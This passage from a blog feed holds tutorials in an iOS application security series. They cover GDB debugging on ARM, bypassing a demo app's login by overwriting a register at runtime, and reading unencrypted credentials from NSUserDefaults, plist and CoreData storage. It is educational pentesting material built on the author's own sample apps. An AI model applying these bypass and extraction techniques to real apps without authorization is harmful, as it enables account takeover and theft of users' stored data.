&lt;p&gt;Once the breakpoint is hit, set the value of r0 register to 1. You can do this by using the command &lt;em&gt;set $r0 = 1&lt;/em&gt;. Repeat this for the other breakpoint as well and continue the application. You will see that you are logged in again without even entering the correct username/password combination.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios22/16.png&quot; alt=&quot;16&quot; /&gt; &lt;img src=&quot;/images/posts/ios22/device3.PNG&quot; alt=&quot;Device3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And BTW, here is the code for the function loginButtonTapped: that we just busted.&lt;/p&gt;

&lt;pre&gt;	- (IBAction)loginButtonTapped:(id)sender {
	  if([_usernameTextField.text isEqualToString:@&quot;Admin&quot;] &amp;amp;&amp;amp; [_passwordTextField.text isEqualToString:@&quot;HELLOiOSAPPLICATIONEXPERTS&quot;]){
	    [self performSegueWithIdentifier:@&quot;adminPage&quot; sender:self];
	  }else{
	    [[[UIAlertView alloc] initWithTitle:@&quot;Error&quot; message:@&quot;Incorrect Username or password&quot; delegate:nil cancelButtonTitle:@&quot;Ok&quot; otherButtonTitles:nil] show];
	  }
	}

&lt;/pre&gt;

&lt;p&gt;In this article, we looked at how we can use GDB to manipulate the application flow during runtime. Knowledege of GDB is beneficial specially in cases like these where the whole logic is contained inside one function and we cannot use method swizzling techniques using Cycript. With good knowledege of ARM assembly and GDB, the ability to modify the application behaviour and manipulate the application flow is just upto your imagination.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 21 – ARM and GDB Basics</title>
   <link href="https://bitbrain.github.io/2013/11/08/ios-application-security-part-21-arm-and-gdb-basics.html"/>
   <updated>2013-11-08T14:50:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/11/08/ios-application-security-part-21-arm-and-gdb-basics</id>
   <content type="html">&lt;p&gt;All the iOS devices released uptil now are based on the ARM architecture. All the Objective-C code that we write while developing iOS applications is first converted into ARM assembly before being converted to machine code (1s and 0s). With good understanding of the ARM assembly language and with good knowledge of debugging using GDB, it is possible for a hacker to decipher the Objective-C code during runtime and even modify it.&lt;/p&gt;

&lt;p&gt;For this article, we will be using a sample application &lt;a href=&quot;https://github.com/prateek147/gdb-demo&quot;&gt;GDB-Demo&lt;/a&gt; from my github account. Make sure to install and run it on your iOS device. If you don’t have a registered developer account to run this on your device, you can follow the instructions mentioned &lt;a href=&quot;http://highaltitudehacks.com/2013/07/25/ios-application-security-part-7-installing-and-running-custom-applications-on-device-without-a-registered-developer-account&quot;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;.&lt;/p&gt;

&lt;p&gt;Now let’s SSH into the device.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios21/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now lets start GDB and ask GDB to hook into our application as soon as it is started. This is done by using the command &lt;em&gt;attach –waitfor Appname&lt;/em&gt;. Optionally, you can also start the application on your device and hook into the running process using the &lt;em&gt;attach&lt;/em&gt; command as shown below.&lt;/p&gt;

&lt;p&gt;. &lt;img src=&quot;/images/posts/ios21/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now once GDB has hooked into the application, you will notice that the application is in a paused state. You can resume the application by just using the &lt;em&gt;c&lt;/em&gt; command. But let’s do some investigation before that. Just like any other architecture, the memory in ARM is divided into registers. All these registers are 32 bit in size (except in iOS 7 which is 64 bit) and their purpose is to hold and move data between each other. You can find information about these registers by just using the &lt;em&gt;info registers&lt;/em&gt; command.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios21/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Please note that this command does not print out all the registers in ARM. To print all the registers, use the command &lt;em&gt;info all-registers&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios21/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To dump the diassembly, just use the &lt;em&gt;disassemble&lt;/em&gt; or &lt;em&gt;disas&lt;/em&gt; command. This will give us the assembly dump for the next few instructions. We can also dump the assembly of a particular function by specifying the function name after the &lt;em&gt;disas&lt;/em&gt; command. For e.g, to dump the assembly for the main function, use the &lt;em&gt;disas main&lt;/em&gt; command.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios21/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If we look at the application that we just installed on our device, we will see that it is just a simple application that prompts for a username and password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios21/IMG_0099.PNG&quot; alt=&quot;IMG 0099&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can also see from the class-dump-z output of the application that there is a class named &lt;em&gt;ViewController&lt;/em&gt; and a method named &lt;em&gt;-(void)loginButtonTapped:(id)tapped;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios21/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With GDB, we can also set breakpoints in the application. You can type the method names to set breakpoints to. Just use the command &lt;em&gt;b functionName&lt;/em&gt;. You can also specify the method signature without the class if you are unsure and GDB will ask you which class you want to set the breakpoint on.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios21/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Please note that instance methods are prefixed with a minus sign &lt;em&gt;-&lt;/em&gt; whereas class methods are prefixed with a plus sign &lt;em&gt;+&lt;/em&gt; as shown below. For e.g, &lt;em&gt;sharedInstance&lt;/em&gt; is a class method that returns the shared instance of a singleton class.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios21/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can see all your breakpoints using the command &lt;em&gt;info breakpoints&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios21/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can remove any breakpoint by using the command &lt;em&gt;delete&lt;/em&gt; followed by the ID of the breakpoint.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios21/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Anyways, lets set a breakpoint for the method &lt;em&gt;loginButtonTapped:&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios21/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can then resume the app by using the &lt;em&gt;continue&lt;/em&gt; or the &lt;em&gt;c&lt;/em&gt; command.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios21/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lets tap on the login button in the app. This will trigger our breakpoint.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios21/13.png&quot; alt=&quot;13&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can then find some of the next instruction by using the disassemble command.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios21/14.png&quot; alt=&quot;14&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To set breakpoint any particular instruction, add the asterix sign before the address for that instruction.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios21/15.png&quot; alt=&quot;15&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In &lt;a href=&quot;http://highaltitudehacks.com/2013/06/16/ios-application-security-part-3-understanding-the-objective-c-runtime/&quot;&gt;part 3&lt;/a&gt; of this article series, we also learnt about the function objc_msgSend. Objective-C is based on messaging and whenever a message is being sent, the objc_msgSend fucntion gets called. In the disassembly code for the function &lt;em&gt;loginButtonTapped:&lt;/em&gt; that we printed out, there are a lot of objc_msgSend calls. A good way to find this out is to look for the &lt;em&gt;blx&lt;/em&gt; instruction. Wherever you see a blx instruction, you can be sure that an objc_msgSend call is happening.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios21/16.png&quot; alt=&quot;16&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Whenever a new method is called or a property is accessed, the objc_msgSend function gets called. So if we can set a breakpoint for the objc_msgSend call and find a way to print out the method being called and the object that calls this method, then this will give us a very good insight into the flow of the app. We had already looked at how Snoop-it was able to find out all the traced calls in &lt;a href=&quot;http://highaltitudehacks.com/2013/08/20/ios-application-security-part-9-analyzing-security-of-ios-applications-using-snoop-it&quot;&gt;part 9&lt;/a&gt; of this series. To find out the methods being called, first we need to look at calling convention for ARM. Here is a screenshot of the ARM calling convention from &lt;a href=&quot;http://en.wikipedia.org/wiki/Calling_convention&quot;&gt;Wikipedia&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios21/17.png&quot; alt=&quot;17&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The important line to note here is this.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios21/18.png&quot; alt=&quot;18&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So we can set a breakpoint for every objc_msgSend call and find the parameters passed to this function by using the values of r0-r3 registers. Let’s have a look at the signature for objc_msgSend call. Here is a screenshot taken from Apple’s &lt;a href=&quot;https://developer.apple.com/library/mac/documentation/cocoa/reference/objcruntimeref/Reference/reference.html#//apple_ref/c/func/objc_msgSend&quot;&gt;documentation&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios21/19.png&quot; alt=&quot;19&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So the first two arguments to the function are &lt;em&gt;self - A pointer that points to the instance of the class that is to receive the message&lt;/em&gt; and &lt;em&gt;op - The selector of the method that handles the message.&lt;/em&gt;. The selector is nothing but the signature for the message. For e.g if a method has the prototype &lt;em&gt;-(void)addOjectsToArray:(NSArray *)array&lt;/em&gt; then the signature for it would be &lt;em&gt;addOjectsToArray:&lt;/em&gt;. And we also know that r0 to r3 are used to hold argument values passed to a subroutine, hence we can conclude that &lt;em&gt;r0 will contain self&lt;/em&gt; and &lt;em&gt;r1 will contain op&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Let’s understand this through an example. Set up a breakpoint for the objc_msgSend call and continue until the breakpoint is hit.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios21/20.png&quot; alt=&quot;20&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we learnt, r0 should contain a pointer to the instance of the class that is to receive the message, r1 should contain the selector and after that starting from r2 should be the arguments for the method. But first we should learn about the &lt;em&gt;x&lt;/em&gt; command. x stands for examine and helps us to examine memory in many different formats. So we can specify the format in which we want to examine the memory. To find out all the options available with this command, use the &lt;em&gt;help x&lt;/em&gt; command.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios21/21.png&quot; alt=&quot;21&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s start by examining r0. We know it will contain a pointer to the instance of the class that will receive the message. Hence the format is address and we use x/a. We use $ before r0 because we want to examine the memory, and hence the $ sign.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios21/22.png&quot; alt=&quot;22&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see that the receiver is an instance of the UIRoundedRectButton class. Now lets try to examine the value in r1 register. We know that it contains the selector, i.e the signature of the method. This is a string and hence we use x/s.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios21/23.png&quot; alt=&quot;23&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, we have to find out the arguments to this method. This can be tricky as we don’t know what format is r2. But looking at the selector which is &lt;em&gt;respondsToSelector:&lt;/em&gt; and using some common sense, we can assume that the argument will be a selector, and hence we again use x/s to examine the memory in string format.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios21/24.png&quot; alt=&quot;24&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Alright, so the argument is &lt;em&gt;debugDescription&lt;/em&gt;. From the method selector, we can see that there is only one argument to this function, hence we don’t worry about examining further registers. So now, we can say that the method being called must be something like this.&lt;/p&gt;

&lt;p&gt;-[UIRoundedRectButton respondsToSelector:@selector(debugDescription)];&lt;/p&gt;

&lt;p&gt;But there are so many objc_msgSend calls and examining all of these calls one by one is such a pain. So lets try and automate this process. In &lt;a href=&quot;http://highaltitudehacks.com/2013/06/16/ios-application-security-part-3-understanding-the-objective-c-runtime/&quot;&gt;part 3&lt;/a&gt; of this series, we learnt how to use the commands option in gdb to print something whenever a breakpint is hit. Let’s use it here as well.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios21/25.png&quot; alt=&quot;25&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now press &lt;em&gt;c&lt;/em&gt; to continue. You will see all the methods being called. This tells us so much about what is happening in the application.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios21/26.png&quot; alt=&quot;26&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now let’s try and print this in Objective-C like syntax. We are going to use the function class_getName mentioned in Apple’s &lt;a href=&quot;https://developer.apple.com/library/mac/documentation/cocoa/reference/objcruntimeref/Reference/reference.html#//apple_ref/c/func/objc_msgSend&quot;&gt;documentation&lt;/a&gt;. As you can see, it requires an argument which is the class object, hence we will pass it r0.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios21/27.png&quot; alt=&quot;27&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now rewrite the calls in commands like this.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios21/28.png&quot; alt=&quot;28&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Type c to continue and now as you can see, the information is in a much more readable format.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios21/29.png&quot; alt=&quot;29&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This tells us so much about what is happening inside an application. In the next article, we will take our knowledge gained from this article and learn how to perform runtime manipulation with GDB.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 20 – Local Data Storage (NSUserDefaults</title>
   <link href="https://bitbrain.github.io/2013/10/26/ios-application-security-part-20-local-data-storage-nsuserdefaults.html"/>
   <updated>2013-10-26T23:39:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/10/26/ios-application-security-part-20-local-data-storage-nsuserdefaults</id>
   <content type="html">&lt;p&gt;In this article, we will look at the different ways in which applicatons can store data locally on the device and look at how secure these methods are.&lt;/p&gt;

&lt;p&gt;We will be performing some of these demonstrations in a sample app that you can download from my &lt;a href=&quot;https://github.com/prateek147/localDataStorageDemo&quot;&gt;github&lt;/a&gt; account. For the CoreData example, you can download the sample app from &lt;a href=&quot;https://github.com/ChrisDrit/Core-Data-Example-Code&quot;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;One of the other things that we will doing different in this example is that we will be running the application on the iOS simulator using Xcode rather than on the device and hence will be analyzing the application on our computer rather than on the device. This is just to demonstrate that you can perform all the steps performed before in &lt;a href=&quot;http://highaltitudehacks.com/security/&quot;&gt;previous&lt;/a&gt; articles on your system as well by running the application via Xcode. Optionally, you can simply run the application on your device using the steps mentioned &lt;a href=&quot;http://highaltitudehacks.com/2013/07/25/ios-application-security-part-7-installing-and-running-custom-applications-on-device-without-a-registered-developer-account&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;nsuserdefaults&quot;&gt;NSUserDefaults&lt;/h2&gt;

&lt;p&gt;One of the most common ways of saving user preferences and properties in an application is by using NSUserDefaults. The information stored in NSUserDefaults persists even if you close the application and start it again. One of the examples of saving information in NSUserDefaults is the logged in state of the user. We can save the logged in state of the user (YES or NO) in NSUserDefaults so that when the user closes the application and starts it again, the application can fetch data from NSUserDefaults and display different UI to the user depending on whether he is logged in or not. Some applications also use this feature to save confidential information like the user’s access token so that the next time the application launches, they can just use that access token to authenticate the user again.&lt;/p&gt;

&lt;p&gt;Download the sample application from my &lt;a href=&quot;https://github.com/prateek147/localDataStorageDemo&quot;&gt;github&lt;/a&gt; page and run it. You will get this view. Now enter some info in the text field related to NSUserDefaults and tap the button that says &lt;em&gt;Save in NSUserDefaults&lt;/em&gt;. This will save the data to NSUserDefaults.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios20/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;What most people do not realize is that the data saved by NSUserDefaults is not encrypted and can be easily viewed from the application bundle. It is stored in a plist file with the name as the &lt;em&gt;bundle Id&lt;/em&gt; of the application. First of all, we must find the application bundle for our application. Since we are running the application on our system, we can find our applications on the path /Users/$username/Library/Application Support/iPhone Simulator/$ios version of simulator/Applications/. In my case, the location is “Users/prateekgianchandani/Library/Application Support/iPhone Simulator/6.1/Applications”&lt;/p&gt;

&lt;p&gt;Once we go to that directory, we can see a bunch of applications. These are all the application that we run via Xcode for that particular iOS version. We can find our application by the date modified tag as it would have the latest modified date.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios20/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Go inside the app bundle. All the contents saved by NSUserDefaults is saved inside a plist file that can be found under Library -&amp;gt; Preferences -&amp;gt; $AppBundleId.plist as shown in the image below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios20/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Open up the plist file and you can easily view the contents of the file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios20/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Sometimes, the plist files can be in binary format and hence not easily viewable at first. You can either convert it into xml format using the &lt;em&gt;plutil&lt;/em&gt; utility or just view the application in a device using the tool &lt;em&gt;iExplorer&lt;/em&gt;.&lt;/p&gt;

&lt;h2 id=&quot;plist-files&quot;&gt;Plist Files&lt;/h2&gt;

&lt;p&gt;Another common way of storing data is in the plist files. Plist files should always be used for saving information that is not confidential as they are unencrypted and can be easily be fetched even from a non-jailbroken device. There have been &lt;a href=&quot;http://garethwright.com/facebook-mobile-security-hole-allows-identity-theft/&quot;&gt;vulnerabilities&lt;/a&gt; reported where big companies have been found to store condifential data like Access tokens, Usernames and passwords in plist files. In the demo app, lets enter the information for plist and tap on &lt;em&gt;Save in plist file&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios20/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here is the code for saving data to the plist file.&lt;/p&gt;

&lt;pre&gt;    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,NSUserDomainMask,YES);
    NSString *documentsDirectory = [paths objectAtIndex:0];
    NSString *filePath = [documentsDirectory stringByAppendingString:@&quot;/userInfo.plist&quot;];
    NSMutableDictionary* plist = [[NSMutableDictionary alloc] init];
    [plist setValue:self.usernameTextField.text forKey:@&quot;username&quot;];
    [plist setValue:self.passwordTextField.text forKey:@&quot;passwprd&quot;];
    [plist writeToFile:filePath atomically:YES];

&lt;/pre&gt;

&lt;p&gt;As you can see from the code, you can always specify a custom path for the plist file. We can then search the entire application bundle for all plist files. In this case, we find a file named userinfo.plist inside the application bundle.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios20/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, it contains the user/pass combination that we had entered in the fields before.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios20/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;coredata-and-sqlite-files&quot;&gt;CoreData and Sqlite files&lt;/h2&gt;

&lt;p&gt;Since CoreData basically uses Sqlite internally to save information, we are only going to cover CoreData here. If you don’t know what CoreData is , here is a screenshot from Apple’s documentation about CoreData.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios20/8.png&quot; alt=&quot;8&quot; /&gt; &lt;img src=&quot;/images/posts/ios20/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So basically, CoreData can be used to create a model, manage relationships between different types of objects, save the data locally, and fetch them from the local cache whenever you want with queries. In this tutorial, we will be using a sample application from &lt;a href=&quot;https://github.com/ChrisDrit/Core-Data-Example-Code&quot;&gt;github&lt;/a&gt;. Once you run it you will see that is is just a simple RSS feed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios20/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This application uses Core Data to save its information. It is important to note that the Core Data framework internally uses Sql queries to store its data and hence all the files are stored as .db files. Let’s go to the app bundle for this app and look at where this information is stored. In the app bundle for this application, you can see that there is a file named MyCoreData.sqlite.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios20/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s analyze it using sqlite3. In my case, the location of the sqlite file is at &lt;em&gt;~/Library/Application Support/iPhone Simulator/6.1/Applications/51038055-3CEC-4D90-98B8-A70BF12C7E9D/Documents&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios20/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, there is a table named &lt;em&gt;ZSTORIES&lt;/em&gt;. In Core Data, every table name is appended with Z at the beginning. This means that the entity name is actually STORIES as we can clearly see from the source files in the project.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios20/13.png&quot; alt=&quot;13&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can easily dump all the values from this table. Make sure the headers are on.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios20/14.png&quot; alt=&quot;14&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, by default, all the data stored in CoreData is unencrypted and can be easily fetched out. Therefore, we should not use CoreData for saving confidential information ever. There are libraries available that act as a wrapper over CoreData and claim to save encrypted dat. There are other implementations as well that store encrypted data on the device without using CoreData. For e.g the Salesforce Mobile SDK use a feature known as &lt;a href=&quot;http://www.modelmetrics.com/tomgersic/storing-data-offline-with-salesforce-mobile-sdk-smartstore/&quot;&gt;SmartStore&lt;/a&gt; that can store encrypted data on the device in the form of Soups.&lt;/p&gt;

&lt;h2 id=&quot;keychain&quot;&gt;Keychain&lt;/h2&gt;

&lt;p&gt;Some developers don’t prefer to save data in the Keychain because it is not that straightforward to implement . However, saving info in the Keychain is probably the most secure way of storing data on a non-jailbroken device. On a jailbroken device however, &lt;a href=&quot;http://highaltitudehacks.com/2013/08/20/ios-application-security-part-12-dumping-keychain-data&quot;&gt;nothing&lt;/a&gt; is secure. &lt;a href=&quot;http://highaltitudehacks.com/2013/09/17/ios-dev-storing-info-in-keychain-with-nsuserdefaults-like-syntax&quot;&gt;Here&lt;/a&gt; is an article that demonstrates how easy it can be to save data in the keychain using simple wrapper classes. Basically, the code for saving data in the keychain is just like saving data with NSUserDefaults with this wrapper. Here is a snippet of code that saves a string to the keychain. Notice that the syntax looks very similar to using NSUserDefaults.&lt;/p&gt;

&lt;pre&gt;   PDKeychainBindings *bindings = [PDKeychainBindings sharedKeychainBindings];
    [bindings setObject:@&quot;XYZ&quot; forKey:@&quot;authToken&quot;];
&lt;/pre&gt;

&lt;p&gt;And here is a small snippet for fetching data from the keychain.&lt;/p&gt;

&lt;pre&gt;   PDKeychainBindings *bindings = [PDKeychainBindings sharedKeychainBindings];
    NSLog(@&quot;Auth token is %@&quot;,[bindings objectForKey:@&quot;authToken&quot;]]);
&lt;/pre&gt;

&lt;h2 id=&quot;small-tricks&quot;&gt;Small Tricks&lt;/h2&gt;

&lt;p&gt;As we discussed before, no information is safe on a jailbroken device. The attacker can get info from Plist files, dump your entire keychain, &lt;a href=&quot;http://highaltitudehacks.com/2013/07/25/ios-application-security-part-8-method-swizzling-using-cycript&quot;&gt;replace&lt;/a&gt; method implementations and can pretty much do anything he wants. But the developer can surely use some small tricks to make sure that the script kiddies find it difficult to get the information they want from the application. It is possible to encrypt files while saving them locally on the device. &lt;a href=&quot;http://highaltitudehacks.com/2013/09/26/ios-dev-encrypted-images-and-saving-them-in-app-sandbox&quot;&gt;Here&lt;/a&gt; is an article that talks about that in good detail. Or you can just make it difficult for them to figure out the correct information. For e.g let’s consider the example of saving the authentication token for a particular user on the keychain. A script kiddie will just try and use the auth token dumped from the keychain and try to hijack the session of the user. If we can just reverse the auth token before saving it on the keychain, the attacker wouldn’t know that the actual auth token is actually reverese of the one stored in the keychain. He can surely trace every call in your application and figure it out, but such simple techniques will help keep the script kiddies guessing for enough time that they will start looking for vulnerabilites in other applications. Another such example of these small tricks could be appending a constant string to the actual value before saving it.&lt;/p&gt;

&lt;p&gt;In the next article, we will look at runtime analysis using GDB.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application Security Part 19 – Programmatical Usage of Introspy</title>
   <link href="https://bitbrain.github.io/2013/10/26/ios-application-security-part-19-programmatical-usage-of-introspy.html"/>
   <updated>2013-10-26T23:38:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/10/26/ios-application-security-part-19-programmatical-usage-of-introspy</id>
   <content type="html">&lt;p&gt;In this article, we will look at how we can Introspy as a python module in our scripts.&lt;/p&gt;

&lt;p&gt;The first thing to do is to import the introspy module and Namespace from argparse module.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios19/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We then create an instance of the Introspy class. The arguments that we need to provide are the database name, the group name, the subgroup name and the list. Now, for this case, lets provide all the parameters as None except the database path. Introspy will hence include all the groups rather than just including a particular group.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios19/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s create an object with a group and a subgroup. Now even though i couldn’t find the different tags of groups and subgroups anywhere in the documentation, but from the HTML reports for Introspy that we generated in the previous articles, i was able to find a list of groups and subgroups. If you look at the image below, all the main menu items can be used as group names whereas all the submenu items can be used as subgroup names.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios19/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So for example, the group names can be DataStorage, Crypto, Network, IPC etc and the subgroup name for the group Network can be HTTP. So let’s create an Instrospy object with the group Network and the subgroup HTTP.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios19/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s look at all the methods and attributes available to the introspy object.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios19/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see the Introspy object has an analyzer attribute. Let’s look at all the methods and attributes for it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios19/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can see all the findings by either using the findings attribute or using the get_findings method.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios19/7.png&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can also look at all the signatures for the analyzer by using the signatures attribute.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios19/8.png&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, these are just instances of the signature object. Let’s try and get some meaningful information from these signatures. If we look at the signatures.py file, we will see that every Signature instance has attributes like title, description, filter etc.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios19/9.png&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So let’s iterate through every Signature object and print out its title and description.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios19/10.png&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, we can pretty much find out whatever we want from these instances. In the next case, i have printed out all the class and the methods combinations from the filters for every signature. Please note that this may not be the exact method implementation used by the filter because the method can be a class or an instance method. For e.g, as shown in the output, there is no method like &lt;em&gt;[NSUserDefaults stringForKey:]&lt;/em&gt; but there is a instance method &lt;em&gt;[[NSUserDefaults standardUserDefaults] stringForKey:]&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios19/11.png&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Every analyzer object has an attribute named tracedCalls which is a list of all the calls traced during runtime. If we look at the code for tracedCalls class, we will see that it has attributes like callId, method, clazz etc.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios19/12.png&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can analyze whatever information we want from any tracedCall. In the image below, i have printed out the attributes for the first traced call.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios19/13.png&quot; alt=&quot;13&quot; /&gt; &lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/p&gt;

